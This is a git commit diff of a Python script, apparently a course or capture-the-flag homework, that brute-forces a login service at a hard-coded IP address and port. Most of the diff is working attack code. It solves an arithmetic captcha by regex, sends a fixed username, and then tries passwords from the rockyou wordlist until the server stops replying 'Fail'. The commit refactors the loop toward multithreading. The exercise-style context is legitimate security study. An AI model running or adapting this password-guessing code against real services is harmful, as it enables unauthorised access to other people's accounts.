71273bc560ed3fc0fd635fadb8b53b9dded00c9f
root <root@localhost.localdomain>
2019-09-10 12:59:16 -0400

    single thread complete

--- week/2/stub.py
+++ week/2/stub.py
@@ -7,7 +7,7 @@ import threading
 host = "157.230.179.99" # IP address here
 port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
-wlmac = "/Users/dokidokicrisis/wordlist/rockyou.txt"
+
 
 def create_threads(passwords,thread_num):
 	p_len = len(passwords)
@@ -42,62 +42,64 @@ def run_brute_force(passwords):
 			if brute_force(pw.rstrip()):
 				pw_find = True
 
-def brute_force():
-	file = open(wlmac,"r")
+def brute_force(pw):
+	file = open(wordlist,"r")
 	username = "ejnorman84"
 	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
 	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
-	counter = 0
 
-	for pw in file:
-		print("Attampt #" + str(counter) + " Trying Passowrd: " + pw)
-		counter += 1
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host, port))
 
-		d1 = str(s.recv(1024))
+	print(" Trying Passowrd: " + pw)
 
-		while re.search(regex,d1) == None:
-			d1 = s.recv(1024)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((host, port))
 
-		print("======data=====")
-		print("|"+d1+"|")
-		print("======end=====")
+	d1 = str(s.recv(1024))
 
-		m = re.search(regex,d1)
-		firstNum = int(m.group('firstNum'))
-		secNum = int(m.group('secNum'))
-		op = m.group('op')
-		res = str(ops[op](firstNum,secNum))
-		print("answr is " + res)
-		s.send(res+"\n")
+	while re.search(regex,d1) == None:
+		d1 = s.recv(1024)
+
+	print("======data=====")
+	print("|"+d1+"|")
+	print("======end=====")
+
+	m = re.search(regex,d1)
+	firstNum = int(m.group('firstNum'))
+	secNum = int(m.group('secNum'))
+	op = m.group('op')
+	res = str(ops[op](firstNum,secNum))
+	print("answr is " + res)
+	s.send(res+"\n")
+	d2 = s.recv(1024)
+	while d2 == "\n":
 		d2 = s.recv(1024)
-		while d2 == "\n":
-			d2 = s.recv(1024)
-		print("d2 is " + d2)
+	print("d2 is " + d2)
 
-		s.send(username + "\n")
+	s.send(username + "\n")
+	d3 = s.recv(1024)
+	while d3 == "\n":
 		d3 = s.recv(1024)
-		while d3 == "\n":
-			d3 = s.recv(1024)
-		print("d3 is " + d3)
+	print("d3 is " + d3)
 
-		s.send(pw + "\n")
+	s.send(pw + "\n")
+	d4 = s.recv(1024)
+	while d4 == "\n":
 		d4 = s.recv(1024)
-		while d4 == "\n":
-			d4 = s.recv(1024)
 
-		print("d4 result is " + d4)
-		if not "Fail" in d4:
-			print("SUCCESS")
-			print("PASSWORD: " + pw)
-			return
+	print("d4 result is " + d4)
+	s.close()
+	print("++++s closed++++")
+	if not "Fail" in d4:
+		print("SUCCESS")
+		print("PASSWORD: " + pw)
+		return True
+	else:
+		return False
 
 
 
-		s.close()
-		print("++++s closed++++")
+		
 
 if __name__ == '__main__':
 	
-	 brute_force()
+	 brute_force("233")
